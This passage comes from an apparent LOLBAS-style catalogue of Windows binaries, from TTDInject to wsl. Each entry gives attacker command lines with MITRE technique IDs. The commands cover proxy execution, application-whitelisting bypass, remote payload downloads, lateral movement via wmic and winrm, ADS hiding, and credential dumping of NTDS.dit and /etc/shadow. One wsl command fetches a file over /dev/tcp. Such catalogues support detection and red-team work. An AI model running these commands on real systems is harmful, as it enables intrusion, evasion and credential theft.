    commands: [{"cmd": "TTDInject.exe /ClientParams \"7 tmp.run 0 0 0 0 0 0 0 0 0 0\" /Launch \"{PATH:.exe}\"", "desc": "Execute a program using ttdinject.exe. Requires administrator privileges. A log file will be created in tmp.run. The log file can be changed, but the length (7) has to be updated.", "usecase": "Spawn process using other binary", "category": "Execute", "mitre": "T1127", "privileges": "Administrator"}, {"cmd": "ttdinject.exe /ClientScenario TTDRecorder /ddload 0 /ClientParams \"7 tmp.run 0 0 0 0 0 0 0 0 0 0\" /launch \"{PATH:.exe}\"", "desc": "Execute a program using ttdinject.exe. Requires administrator privileges. A log file will be created in tmp.run. The log file can be changed, but the length (7) has to be updated.", "usecase": "Spawn process using other binary", "category": "Execute", "mitre": "T1127", "privileges": "Administrator"}]
  },
  "tttracer": {
    name: "Tttracer.exe",
    description: "Used by Windows 1809 and newer to Debug Time Travel",
    path: ["C:\\Windows\\System32\\tttracer.exe", "C:\\Windows\\SysWOW64\\tttracer.exe"],
    commands: [{"cmd": "tttracer.exe {PATH_ABSOLUTE:.exe}", "desc": "Execute specified executable from tttracer.exe. Requires administrator privileges.", "usecase": "Spawn process using other binary", "category": "Execute", "mitre": "T1127", "privileges": "Administrator"}, {"cmd": "TTTracer.exe -dumpFull -attach {PID}", "desc": "Dumps process using tttracer.exe. Requires administrator privileges", "usecase": "Dump process by PID", "category": "Dump", "mitre": "T1003", "privileges": "Administrator"}]
  },
  "unregmp2": {
    name: "Unregmp2.exe",
    description: "Microsoft Windows Media Player Setup Utility",
    path: ["C:\\Windows\\System32\\unregmp2.exe", "C:\\Windows\\SysWOW64\\unregmp2.exe"],
    commands: [{"cmd": "rmdir %temp%\\lolbin /s /q 2>nul & mkdir \"%temp%\\lolbin\\Windows Media Player\" & copy C:\\Windows\\System32\\calc.exe \"%temp%\\lolbin\\Windows Media Player\\wmpnscfg.exe\" >nul && cmd /V /C \"set \"ProgramW6432=%temp%\\lolbin\" && unregmp2.exe /HideWMP\"", "desc": "Allows an attacker to copy a target binary to a controlled directory and modify the 'ProgramW6432' environment variable to point to that controlled directory, then execute 'unregmp2.exe' with argument '/HideWMP' which will spawn a process at the hijacked path '%ProgramW6432%\\wmpnscfg.exe'.", "usecase": "Proxy execution of binary", "category": "Execute", "mitre": "T1202", "privileges": "User"}]
  },
  "update": {
    name: "Update.exe",
    description: "Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.",
    path: ["C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Teams\\update.exe"],
    commands: [{"cmd": "Update.exe --download {REMOTEURL}", "desc": "The above binary will go to url and look for RELEASES file and download the nuget package.", "usecase": "Download binary", "category": "Download", "mitre": "T1218", "privileges": "User"}, {"cmd": "Update.exe --update={REMOTEURL}", "desc": "The above binary will go to url and look for RELEASES file, download and install the nuget package.", "usecase": "Download and execute binary", "category": "AWL Bypass", "mitre": "T1218", "privileges": "User"}, {"cmd": "Update.exe --update={REMOTEURL}", "desc": "The above binary will go to url and look for RELEASES file, download and install the nuget package.", "usecase": "Download and execute binary", "category": "Execute", "mitre": "T1218", "privileges": "User"}, {"cmd": "Update.exe --update={PATH_SMB:folder}", "desc": "The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.", "usecase": "Download and execute binary", "category": "AWL Bypass", "mitre": "T1218", "privileges": "User"}, {"cmd": "Update.exe --update={PATH_SMB:folder}", "desc": "The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.", "usecase": "Download and execute binary", "category": "Execute", "mitre": "T1218", "privileges": "User"}, {"cmd": "Update.exe --updateRollback={REMOTEURL}", "desc": "The above binary will go to url and look for RELEASES file, download and install the nuget package.", "usecase": "Download and execute binary", "category": "AWL Bypass", "mitre": "T1218", "privileges": "User"}, {"cmd": "Update.exe --updateRollback={REMOTEURL}", "desc": "The above binary will go to url and look for RELEASES file, download and install the nuget package.", "usecase": "Download and execute binary", "category": "Execute", "mitre": "T1218", "privileges": "User"}, {"cmd": "Update.exe --processStart {PATH:.exe} --process-start-args \"{CMD:args}\"", "desc": "Copy your payload into %userprofile%\\AppData\\Local\\Microsoft\\Teams\\current\\. Then run the command. Update.exe will execute the file you copied.", "usecase": "Application Whitelisting Bypass", "category": "AWL Bypass", "mitre": "T1218", "privileges": "User"}, {"cmd": "Update.exe --updateRollback={PATH_SMB:folder}", "desc": "The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.", "usecase": "Download and execute binary", "category": "AWL Bypass", "mitre": "T1218", "privileges": "User"}, {"cmd": "Update.exe --updateRollback={PATH_SMB:folder}", "desc": "The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.", "usecase": "Download and execute binary", "category": "Execute", "mitre": "T1218", "privileges": "User"}, {"cmd": "Update.exe --processStart {PATH:.exe} --process-start-args \"{CMD:args}\"", "desc": "Copy your payload into %userprofile%\\AppData\\Local\\Microsoft\\Teams\\current\\. Then run the command. Update.exe will execute the file you copied.", "usecase": "Execute binary", "category": "Execute", "mitre": "T1218", "privileges": "User"}, {"cmd": "Update.exe --createShortcut={PATH:.exe} -l=Startup", "desc": "Copy your payload into \"%localappdata%\\Microsoft\\Teams\\current\\\". Then run the command. Update.exe will create a shortcut to the specified executable in \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\". Then payload will run on every login of the user who runs it.", "usecase": "Execute binary", "category": "Execute", "mitre": "T1547", "privileges": "User"}, {"cmd": "Update.exe --removeShortcut={PATH:.exe}-l=Startup", "desc": "Run the command to remove the shortcut created in the \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" directory you created with the LolBinExecution \"--createShortcut\" described on this page.", "usecase": "Execute binary", "category": "Execute", "mitre": "T1070", "privileges": "User"}]
  },
  "utilityfunctions": {
    name: "UtilityFunctions.ps1",
    description: "PowerShell Diagnostic Script",
    path: ["C:\\Windows\\diagnostics\\system\\Networking\\UtilityFunctions.ps1"],
    commands: [{"cmd": "powershell.exe -ep bypass -command \"set-location -path c:\\windows\\diagnostics\\system\\networking; import-module .\\UtilityFunctions.ps1; RegSnapin ..\\..\\..\\..\\temp\\unsigned.dll;[Program.Class]::Main()\"", "desc": "Proxy execute Managed DLL with PowerShell", "usecase": "Execute proxied payload with Microsoft signed binary", "category": "Execute", "mitre": "T1216", "privileges": "User"}]
  },
  "vbc": {
    name: "vbc.exe",
    description: "Binary file used for compile vbs code",
    path: ["C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\vbc.exe", "C:\\Windows\\Microsoft.NET\\Framework\\v3.5\\vbc.exe", "C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe", "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\vbc.exe", "C:\\Windows\\Microsoft.NET\\Framework64\\v3.5\\vbc.exe", "C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\vbc.exe"],
    commands: [{"cmd": "vbc.exe /target:exe {PATH_ABSOLUTE:.vb}", "desc": "Binary file used by .NET to compile Visual Basic code to an executable.", "usecase": "Compile attacker code on system. Bypass defensive counter measures.", "category": "Compile", "mitre": "T1127", "privileges": "User"}, {"cmd": "vbc -reference:Microsoft.VisualBasic.dll {PATH_ABSOLUTE:.vb}", "desc": "Binary file used by .NET to compile Visual Basic code to an executable.", "usecase": "Compile attacker code on system. Bypass defensive counter measures.", "category": "Compile", "mitre": "T1127", "privileges": "User"}]
  },
  "verclsid": {
    name: "Verclsid.exe",
    description: "Used to verify a COM object before it is instantiated by Windows Explorer",
    path: ["C:\\Windows\\System32\\verclsid.exe", "C:\\Windows\\SysWOW64\\verclsid.exe"],
    commands: [{"cmd": "verclsid.exe /S /C {CLSID}", "desc": "Used to verify a COM object before it is instantiated by Windows Explorer", "usecase": "Run a COM object created in registry to evade defensive counter measures", "category": "Execute", "mitre": "T1218.012", "privileges": "User"}]
  },
  "visio": {
    name: "Visio.exe",
    description: "Microsoft Visio Executable",
    path: ["C:\\Program Files (x86)\\Microsoft Office\\Office14\\Visio.exe", "C:\\Program Files\\Microsoft Office\\Office14\\Visio.exe", "C:\\Program Files (x86)\\Microsoft Office\\Office15\\Visio.exe", "C:\\Program Files\\Microsoft Office\\Office15\\Visio.exe", "C:\\Program Files (x86)\\Microsoft Office\\Office16\\Visio.exe", "C:\\Program Files\\Microsoft Office\\Office16\\Visio.exe", "C:\\Program Files (x86)\\Microsoft Office\\root\\Office14\\Visio.exe", "C:\\Program Files\\Microsoft Office\\root\\Office14\\Visio.exe", "C:\\Program Files (x86)\\Microsoft Office\\root\\Office15\\Visio.exe", "C:\\Program Files\\Microsoft Office\\root\\Office15\\Visio.exe", "C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\Visio.exe", "C:\\Program Files\\Microsoft Office\\root\\Office16\\Visio.exe"],
    commands: [{"cmd": "Visio.exe {REMOTEURL}", "desc": "Downloads payload from remote server", "usecase": "It will download a remote payload and place it in INetCache.", "category": "Download", "mitre": "T1105", "privileges": "User"}]
  },
  "visualuiaverifynative": {
    name: "VisualUiaVerifyNative.exe",
    description: "A Windows SDK binary for manual and automated testing of Microsoft UI Automation implementation and controls.",
    path: ["c:\\Program Files (x86)\\Windows Kits\\10\\bin\\<version>\\arm64\\UIAVerify\\VisualUiaVerifyNative.exe", "c:\\Program Files (x86)\\Windows Kits\\10\\bin\\<version>\\x64\\UIAVerify\\VisualUiaVerifyNative.exe", "c:\\Program Files (x86)\\Windows Kits\\10\\bin\\<version>\\UIAVerify\\VisualUiaVerifyNative.exe"],
    commands: [{"cmd": "VisualUiaVerifyNative.exe", "desc": "Generate Serialized gadget and save to - `C:\\Users\\%USERNAME%\\AppData\\Roaminguiverify.config` before executing.", "usecase": "Execute proxied payload with Microsoft signed binary to bypass WDAC policies", "category": "AWL Bypass", "mitre": "T1218", "privileges": "User"}]
  },
  "vsdiagnostics": {
    name: "VSDiagnostics.exe",
    description: "Command-line tool used for performing diagnostics.",
    path: ["C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Team Tools\\DiagnosticsHub\\Collector\\VSDiagnostics.exe"],
    commands: [{"cmd": "VSDiagnostics.exe start 1 /launch:{PATH:.exe}", "desc": "Starts a collection session with sessionID 1 and calls kernelbase.CreateProcessW to launch specified executable.", "usecase": "Proxy execution of binary", "category": "Execute", "mitre": "T1127", "privileges": "User"}, {"cmd": "VSDiagnostics.exe start 2 /launch:{PATH:.exe} /launchArgs:\"{CMD:args}\"", "desc": "Starts a collection session with sessionID 2 and calls kernelbase.CreateProcessW to launch specified executable. Arguments specified in launchArgs are passed to CreateProcessW.", "usecase": "Proxy execution of binary with arguments", "category": "Execute", "mitre": "T1127", "privileges": "User"}]
  },
  "vshadow": {
    name: "Vshadow.exe",
    description: "VShadow is a command-line tool that can be used to create and manage volume shadow copies.",
    path: ["C:\\Program Files (x86)\\Windows Kits\\10\\bin\\<version>\\x64\\vshadow.exe"],
    commands: [{"cmd": "vshadow.exe -nw -exec={PATH_ABSOLUTE:.exe} C:", "desc": "Executes specified executable from vshadow.exe.", "usecase": "Performs execution of specified executable file.", "category": "Execute", "mitre": "T1202", "privileges": "Administrator"}]
  },
  "vsiisexelauncher": {
    name: "VSIISExeLauncher.exe",
    description: "Binary will execute specified binary. Part of VS/VScode installation.",
    path: ["C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\Common7\\IDE\\Extensions\\Microsoft\\Web Tools\\ProjectSystem\\VSIISExeLauncher.exe"],
    commands: [{"cmd": "VSIISExeLauncher.exe -p {PATH:.exe} -a \"{CMD:args}\"", "desc": "The above binary will execute other binary.", "usecase": "Execute any binary with given arguments.", "category": "Execute", "mitre": "T1218", "privileges": "User"}]
  },
  "vsjitdebugger": {
    name: "vsjitdebugger.exe",
    description: "Just-In-Time (JIT) debugger included with Visual Studio",
    path: ["c:\\windows\\system32\\vsjitdebugger.exe"],
    commands: [{"cmd": "Vsjitdebugger.exe {PATH:.exe}", "desc": "Executes specified executable as a subprocess of Vsjitdebugger.exe.", "usecase": "Execution of local PE file as a subprocess of Vsjitdebugger.exe.", "category": "Execute", "mitre": "T1127", "privileges": "User"}]
  },
  "vslaunchbrowser": {
    name: "VSLaunchBrowser.exe",
    description: "Microsoft Visual Studio browser launcher tool for web applications debugging",
    path: ["C:\\Program Files\\Microsoft Visual Studio\\<version>\\Community\\Common7\\IDE\\VSLaunchBrowser.exe", "C:\\Program Files (x86)\\Microsoft Visual Studio\\<version>\\Community\\Common7\\IDE\\VSLaunchBrowser.exe"],
    commands: [{"cmd": "VSLaunchBrowser.exe .exe {REMOTEURL:.exe}", "desc": "Download and execute payload from remote server", "usecase": "It will download a remote file to INetCache and open it using the default app associated with the supplied file extension with VSLaunchBrowser as parent process.", "category": "Download", "mitre": "T1105", "privileges": "User"}, {"cmd": "VSLaunchBrowser.exe .exe {PATH_ABSOLUTE:.exe}", "desc": "Execute payload via VSLaunchBrowser as parent process", "usecase": "It will open a local file using the default app associated with the supplied file extension with VSLaunchBrowser as parent process.", "category": "Execute", "mitre": "T1127", "privileges": "User"}, {"cmd": "VSLaunchBrowser.exe .exe {PATH_SMB}", "desc": "Execute payload from WebDAV server via VSLaunchBrowser as parent process", "usecase": "It will open a remote file using the default app associated with the supplied file extension with VSLaunchBrowser as parent process.", "category": "Execute", "mitre": "T1127", "privileges": "User"}]
  },
  "vsls-agent": {
    name: "vsls-agent.exe",
    description: "Agent for Visual Studio Live Share (Code Collaboration)",
    path: ["c:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Professional\\Common7\\IDE\\Extensions\\Microsoft\\LiveShare\\Agent\\vsls-agent.exe"],
    commands: [{"cmd": "vsls-agent.exe --agentExtensionPath {PATH_ABSOLUTE:.dll}", "desc": "Load a library payload using the --agentExtensionPath parameter (32-bit)", "usecase": "Execute proxied payload with Microsoft signed binary", "category": "Execute", "mitre": "T1218", "privileges": "User"}]
  },
  "vstest.console": {
    name: "vstest.console.exe",
    description: "VSTest.Console.exe is the command-line tool to run tests",
    path: ["C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\IDE\\CommonExtensions\\Microsoft\\TestWindow\\vstest.console.exe", "C:\\Program Files (x86)\\Microsoft Visual Studio\\2022\\TestAgent\\Common7\\IDE\\CommonExtensions\\Microsoft\\TestWindow\\vstest.console.exe"],
    commands: [{"cmd": "vstest.console.exe {PATH:.dll}", "desc": "VSTest functionality may allow an adversary to executes their malware by wrapping it as a test method then build it to a .exe or .dll file to be later run by vstest.console.exe. This may both allow AWL bypass or defense bypass in general", "usecase": "Proxy Execution and AWL bypass, Adversaries may run malicious code embedded inside the test methods of crafted dll/exe", "category": "AWL Bypass", "mitre": "T1127", "privileges": "User"}]
  },
  "wab": {
    name: "Wab.exe",
    description: "Windows address book manager",
    path: ["C:\\Program Files\\Windows Mail\\wab.exe", "C:\\Program Files (x86)\\Windows Mail\\wab.exe"],
    commands: [{"cmd": "wab.exe", "desc": "Change HKLM\\Software\\Microsoft\\WAB\\DLLPath and execute DLL of choice", "usecase": "Execute dll file. Bypass defensive counter measures", "category": "Execute", "mitre": "T1218", "privileges": "Administrator"}]
  },
  "wbadmin": {
    name: "wbadmin.exe",
    description: "Windows Backup Administration utility",
    path: ["C:\\Windows\\System32\\wbadmin.exe"],
    commands: [{"cmd": "wbadmin start backup -backupTarget:{PATH_ABSOLUTE:folder} -include:C:\\Windows\\NTDS\\NTDS.dit,C:\\Windows\\System32\\config\\SYSTEM -quiet", "desc": "Extract NTDS.dit and SYSTEM hive into backup virtual hard drive file (.vhdx)", "usecase": "Snapshoting of Active Directory NTDS.dit database", "category": "Dump", "mitre": "T1003.003", "privileges": "Administrator, Backup Operators, SeBackupPrivilege"}, {"cmd": "wbadmin start recovery -version:<VERSIONIDENTIFIER> -recoverytarget:{PATH_ABSOLUTE:folder} -itemtype:file -items:C:\\Windows\\NTDS\\NTDS.dit,C:\\Windows\\System32\\config\\SYSTEM -notRestoreAcl -quiet", "desc": "Restore a version of NTDS.dit and SYSTEM hive into file path. The command `wbadmin get versions` can be used to find version identifiers.", "usecase": "Dumping of Active Directory NTDS.dit database", "category": "Dump", "mitre": "T1003.003", "privileges": "Administrator, Backup Operators, SeBackupPrivilege"}]
  },
  "wbemtest": {
    name: "wbemtest.exe",
    description: "WMI/WBEM Test Binary",
    path: ["c:\\windows\\system32\\wbem\\wbemtest.exe"],
    commands: [{"cmd": "wbemtest.exe", "desc": "Execute arbitary commands through WMI through a GUI managment interface for Web Based Enterprise Management testing (WBEM). Uses WMI to Create and instance of a Win32_Process WMI class with a commandline argument of the target command to spawn. Spawns a GUI so it requires interactive access. For a demo, see link to blog in resources.", "usecase": "Execute arbitrary commands through WMI classes", "category": "Execute", "mitre": "T1047", "privileges": "Any"}]
  },
  "wfc": {
    name: "Wfc.exe",
    description: "The Workflow Command-line Compiler tool is included with the Windows Software Development Kit (SDK).",
    path: ["C:\\Program Files (x86)\\Microsoft SDKs\\Windows\\v10.0A\\bin\\NETFX 4.8 Tools\\wfc.exe"],
    commands: [{"cmd": "wfc.exe {PATH_ABSOLUTE:.xoml}", "desc": "Execute arbitrary C# code embedded in a XOML file.", "usecase": "Execute proxied payload with Microsoft signed binary to bypass WDAC policies", "category": "AWL Bypass", "mitre": "T1127", "privileges": "User"}]
  },
  "wfmformat": {
    name: "WFMFormat.exe",
    description: "Command-line tool used for pretty-print a dump file generated by Message Farm Analyzer tool.",
    path: ["C:\\there\\is\\no\\default\\installation\\path\\WFMFormat.exe"],
    commands: [{"cmd": "WFMFormat.exe", "desc": "Executes the file `tracerpt.exe` in the same folder as `WFMFormat.exe`. If the file `dumpfile.txt` (any content) exists in the current working directory, no arguments are required. Note that `WFMFormat.exe` requires .NET Framework 3.5.", "usecase": "Proxy execution of binary", "category": "Execute", "mitre": "T1127", "privileges": "User"}]
  },
  "windbg": {
    name: "WinDbg.exe",
    description: "Windows Debugger for advanced user-mode and kernel-mode debugging.",
    path: ["C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x64\\windbg.exe", "C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x86\\windbg.exe", "C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\arm\\windbg.exe", "C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\arm64\\windbg.exe"],
    commands: [{"cmd": "windbg.exe -g {CMD}", "desc": "Launches a command line through the debugging process; optionally add `-G` to exit the debugger automatically.", "usecase": "Executes an executable under a trusted microsoft signed binary.", "category": "Execute", "mitre": "T1127", "privileges": "User"}]
  },
  "winfile": {
    name: "winfile.exe",
    description: "Windows File Manager executable",
    path: ["C:\\Windows\\System32\\winfile.exe", "C:\\Windows\\winfile.exe", "C:\\Program Files\\WinFile\\winfile.exe", "C:\\Program Files (x86)\\WinFile\\winfile.exe", "C:\\Program Files\\WindowsApps\\Microsoft.WindowsFileManager_10.3.0.0_x64__8wekyb3d8bbwe\\WinFile\\winfile.exe"],
    commands: [{"cmd": "winfile.exe {PATH:.exe}", "desc": "Execute an executable file with WinFile as a parent process.", "usecase": "Performs execution of specified file, can be used as a defense evasion", "category": "Execute", "mitre": "T1202", "privileges": "User"}]
  },
  "winget": {
    name: "winget.exe",
    description: "Windows Package Manager tool",
    path: ["C:\\Users\\user\\AppData\\Local\\Microsoft\\WindowsApps\\winget.exe"],
    commands: [{"cmd": "winget.exe install --manifest {PATH:.yml}", "desc": "Downloads a file from the web address specified in .yml file and executes it on the system. Local manifest setting must be enabled in winget for it to work: `winget settings --enable LocalManifestFiles`", "usecase": "Download and execute an arbitrary file from the internet", "category": "Execute", "mitre": "T1105", "privileges": "Local Administrator - required to enable local manifest setting"}, {"cmd": "winget.exe install --accept-package-agreements -s msstore {name or ID}", "desc": "Download and install any software from the Microsoft Store using its name or Store ID, even if the Microsoft Store App itself is blocked on the machine. For example, use \"Sysinternals Suite\" or `9p7knl5rwt25` for obtaining ProcDump, PsExec via the Sysinternals Suite. Note: a Microsoft account is required for this.", "usecase": "Download and install software from Microsoft Store, even if Microsoft Store App is blocked", "category": "Download", "mitre": "T1105", "privileges": "User"}, {"cmd": "winget.exe install --accept-package-agreements -s msstore {name or ID}", "desc": "Download and install any software from the Microsoft Store using its name or Store ID, even if the Microsoft Store App itself is blocked on the machine, and even if AppLocker is active on the machine. For example, use \"Sysinternals Suite\" or `9p7knl5rwt25` for obtaining ProcDump, PsExec via the Sysinternals Suite. Note: a Microsoft account is required for this.", "usecase": "Download and install software from Microsoft Store, even if Microsoft Store App is blocked, and AppLocker is activated on the machine", "category": "AWL Bypass", "mitre": "T1105", "privileges": "User"}]
  },
  "winproj": {
    name: "WinProj.exe",
    description: "Microsoft Project Executable",
    path: ["C:\\Program Files (x86)\\Microsoft Office\\Office14\\WinProj.exe", "C:\\Program Files\\Microsoft Office\\Office14\\WinProj.exe", "C:\\Program Files (x86)\\Microsoft Office\\Office15\\WinProj.exe", "C:\\Program Files\\Microsoft Office\\Office15\\WinProj.exe", "C:\\Program Files (x86)\\Microsoft Office\\Office16\\WinProj.exe", "C:\\Program Files\\Microsoft Office\\Office16\\WinProj.exe", "C:\\Program Files (x86)\\Microsoft Office\\root\\Office14\\WinProj.exe", "C:\\Program Files\\Microsoft Office\\root\\Office14\\WinProj.exe", "C:\\Program Files (x86)\\Microsoft Office\\root\\Office15\\WinProj.exe", "C:\\Program Files\\Microsoft Office\\root\\Office15\\WinProj.exe", "C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\WinProj.exe", "C:\\Program Files\\Microsoft Office\\root\\Office16\\WinProj.exe"],
    commands: [{"cmd": "WinProj.exe {REMOTEURL}", "desc": "Downloads payload from remote server", "usecase": "It will download a remote payload and place it in INetCache.", "category": "Download", "mitre": "T1105", "privileges": "User"}]
  },
  "winrm": {
    name: "winrm.vbs",
    description: "Script used for manage Windows RM settings",
    path: ["C:\\Windows\\System32\\winrm.vbs", "C:\\Windows\\SysWOW64\\winrm.vbs"],
    commands: [{"cmd": "winrm invoke Create wmicimv2/Win32_Process @{CommandLine=\"{CMD}\"} -r:http://target:5985", "desc": "Lateral movement/Remote Command Execution via WMI Win32_Process class over the WinRM protocol", "usecase": "Proxy execution", "category": "Execute", "mitre": "T1216", "privileges": "User"}, {"cmd": "winrm invoke Create wmicimv2/Win32_Service @{Name=\"Evil\";DisplayName=\"Evil\";PathName=\"{CMD}\"} -r:http://acmedc:5985 && winrm invoke StartService wmicimv2/Win32_Service?Name=Evil -r:http://acmedc:5985", "desc": "Lateral movement/Remote Command Execution via WMI Win32_Service class over the WinRM protocol", "usecase": "Proxy execution", "category": "Execute", "mitre": "T1216", "privileges": "Admin"}, {"cmd": "%SystemDrive%\\BypassDir\\cscript //nologo %windir%\\System32\\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty", "desc": "Bypass AWL solutions by copying cscript.exe to an attacker-controlled location; creating a malicious WsmPty.xsl in the same location, and executing winrm.vbs via the relocated cscript.exe.", "usecase": "Execute arbitrary, unsigned code via XSL script", "category": "AWL Bypass", "mitre": "T1220", "privileges": "User"}]
  },
  "winword": {
    name: "Winword.exe",
    description: "Microsoft Office binary",
    path: ["C:\\Program Files\\Microsoft Office\\root\\Office16\\winword.exe", "C:\\Program Files (x86)\\Microsoft Office 16\\ClientX86\\Root\\Office16\\winword.exe", "C:\\Program Files\\Microsoft Office 16\\ClientX64\\Root\\Office16\\winword.exe", "C:\\Program Files (x86)\\Microsoft Office\\Office16\\winword.exe", "C:\\Program Files\\Microsoft Office\\Office16\\winword.exe", "C:\\Program Files (x86)\\Microsoft Office 15\\ClientX86\\Root\\Office15\\winword.exe", "C:\\Program Files\\Microsoft Office 15\\ClientX64\\Root\\Office15\\winword.exe", "C:\\Program Files (x86)\\Microsoft Office\\Office15\\winword.exe", "C:\\Program Files\\Microsoft Office\\Office15\\winword.exe", "C:\\Program Files (x86)\\Microsoft Office 14\\ClientX86\\Root\\Office14\\winword.exe", "C:\\Program Files\\Microsoft Office 14\\ClientX64\\Root\\Office14\\winword.exe", "C:\\Program Files (x86)\\Microsoft Office\\Office14\\winword.exe", "C:\\Program Files\\Microsoft Office\\Office14\\winword.exe", "C:\\Program Files (x86)\\Microsoft Office\\Office12\\winword.exe", "C:\\Program Files\\Microsoft Office\\Office12\\winword.exe", "C:\\Program Files\\Microsoft Office\\Office12\\winword.exe"],
    commands: [{"cmd": "winword.exe {REMOTEURL}", "desc": "Downloads payload from remote server", "usecase": "It will download a remote payload and place it in INetCache.", "category": "Download", "mitre": "T1105", "privileges": "User"}]
  },
  "wlrmdr": {
    name: "Wlrmdr.exe",
    description: "Windows Logon Reminder executable",
    path: ["c:\\windows\\system32\\wlrmdr.exe"],
    commands: [{"cmd": "wlrmdr.exe -s 3600 -f 0 -t _ -m _ -a 11 -u {PATH:.exe}", "desc": "Execute executable with wlrmdr.exe as parent process", "usecase": "Use wlrmdr as a proxy binary to evade defensive countermeasures", "category": "Execute", "mitre": "T1202", "privileges": "User"}]
  },
  "wmic": {
    name: "Wmic.exe",
    description: "The WMI command-line (WMIC) utility provides a command-line interface for WMI",
    path: ["C:\\Windows\\System32\\wbem\\wmic.exe", "C:\\Windows\\SysWOW64\\wbem\\wmic.exe"],
    commands: [{"cmd": "wmic.exe process call create \"{PATH_ABSOLUTE}:program.exe\"", "desc": "Execute a .EXE file stored as an Alternate Data Stream (ADS)", "usecase": "Execute binary file hidden in Alternate data streams to evade defensive counter measures", "category": "ADS", "mitre": "T1564.004", "privileges": "User"}, {"cmd": "wmic.exe process call create \"{CMD}\"", "desc": "Execute calc from wmic", "usecase": "Execute binary from wmic to evade defensive counter measures", "category": "Execute", "mitre": "T1218", "privileges": "User"}, {"cmd": "wmic.exe /node:\"192.168.0.1\" process call create \"{CMD}\"", "desc": "Execute evil.exe on the remote system.", "usecase": "Execute binary on a remote system", "category": "Execute", "mitre": "T1218", "privileges": "User"}, {"cmd": "wmic.exe process get brief /format:\"{REMOTEURL:.xsl}\"", "desc": "Create a volume shadow copy of NTDS.dit that can be copied.", "usecase": "Execute binary on remote system", "category": "Execute", "mitre": "T1218", "privileges": "User"}, {"cmd": "wmic.exe process get brief /format:\"{PATH_SMB:.xsl}\"", "desc": "Executes JScript or VBScript embedded in the target remote XSL stylsheet.", "usecase": "Execute script from remote system", "category": "Execute", "mitre": "T1218", "privileges": "User"}, {"cmd": "wmic.exe datafile where \"Name='C:\\\\windows\\\\system32\\\\calc.exe'\" call Copy \"C:\\\\users\\\\public\\\\calc.exe\"", "desc": "Copy file from source to destination.", "usecase": "Copy file.", "category": "Copy", "mitre": "T1105", "privileges": "User"}]
  },
  "workfolders": {
    name: "WorkFolders.exe",
    description: "Work Folders",
    path: ["C:\\Windows\\System32\\WorkFolders.exe"],
    commands: [{"cmd": "WorkFolders", "desc": "Execute `control.exe` in the current working directory", "usecase": "Can be used to evade defensive countermeasures or to hide as a persistence mechanism", "category": "Execute", "mitre": "T1218", "privileges": "User"}, {"cmd": "WorkFolders", "desc": "`WorkFolders` attempts to execute `control.exe`. By modifying the default value of the App Paths registry key for `control.exe` in `HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe`, an attacker can achieve proxy execution.", "usecase": "Proxy execution of a malicious payload via App Paths registry hijacking.", "category": "Execute", "mitre": "T1218", "privileges": "User"}]
  },
  "write": {
    name: "write.exe",
    description: "Windows Write",
    path: ["C:\\Windows\\write.exe", "C:\\Windows\\System32\\write.exe", "C:\\Windows\\SysWOW64\\write.exe"],
    commands: [{"cmd": "write.exe", "desc": "Executes a binary provided in default value of `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\wordpad.exe`.", "usecase": "Execute binary through legitimate proxy. This might be utilized to confuse detection solutions that rely on parent-child relationships.", "category": "Execute", "mitre": "T1218", "privileges": "User"}]
  },
  "wscript": {
    name: "Wscript.exe",
    description: "Used by Windows to execute scripts",
    path: ["C:\\Windows\\System32\\wscript.exe", "C:\\Windows\\SysWOW64\\wscript.exe"],
    commands: [{"cmd": "wscript //e:vbscript {PATH}:script.vbs", "desc": "Execute script stored in an alternate data stream", "usecase": "Execute hidden code to evade defensive counter measures", "category": "ADS", "mitre": "T1564.004", "privileges": "User"}, {"cmd": "echo GetObject(\"script:{REMOTEURL:.js}\") > {PATH_ABSOLUTE}:hi.js && wscript.exe {PATH_ABSOLUTE}:hi.js", "desc": "Download and execute script stored in an alternate data stream", "usecase": "Execute hidden code to evade defensive counter measures", "category": "ADS", "mitre": "T1564.004", "privileges": "User"}]
  },
  "wsl": {
    name: "Wsl.exe",
    description: "Windows subsystem for Linux executable",
    path: ["C:\\Windows\\System32\\wsl.exe"],
    commands: [{"cmd": "wsl.exe -e /mnt/c/Windows/System32/calc.exe", "desc": "Executes calc.exe from wsl.exe", "usecase": "Performs execution of specified file, can be used to execute arbitrary Linux commands.", "category": "Execute", "mitre": "T1202", "privileges": "User"}, {"cmd": "wsl.exe -u root -e cat /etc/shadow", "desc": "Cats /etc/shadow file as root", "usecase": "Performs execution of arbitrary Linux commands as root without need for password.", "category": "Execute", "mitre": "T1202", "privileges": "User"}, {"cmd": "wsl.exe --exec bash -c \"{CMD}\"", "desc": "Executes Linux command (for example via bash) as the default user (unless stated otherwise using `-u <username>`) on the default WSL distro (unless stated otherwise using `-d <distro name>`)", "usecase": "Performs execution of arbitrary Linux commands.", "category": "Execute", "mitre": "T1202", "privileges": "User"}, {"cmd": "wsl.exe --exec bash -c 'cat < /dev/tcp/192.168.1.10/54 > binary'", "desc": "Downloads file from 192.168.1.10", "usecase": "Download file", "category": "Download", "mitre": "T1105", "privileges": "User"}, {"cmd": "wsl.exe", "desc": "When executed, `wsl.exe` queries the registry value of 